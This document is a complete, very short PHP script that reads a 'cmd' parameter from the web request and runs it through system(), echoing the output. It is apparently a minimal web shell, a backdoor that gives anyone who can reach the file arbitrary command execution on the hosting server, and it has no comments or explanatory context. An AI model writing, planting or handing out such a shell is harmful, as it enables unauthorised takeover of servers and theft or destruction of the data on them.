<?php
$Mcmd = $_REQUEST['cmd'];
print "<pre>\n";
$output = system($Mcmd);
print "</pre>\n";
echo $output;

?>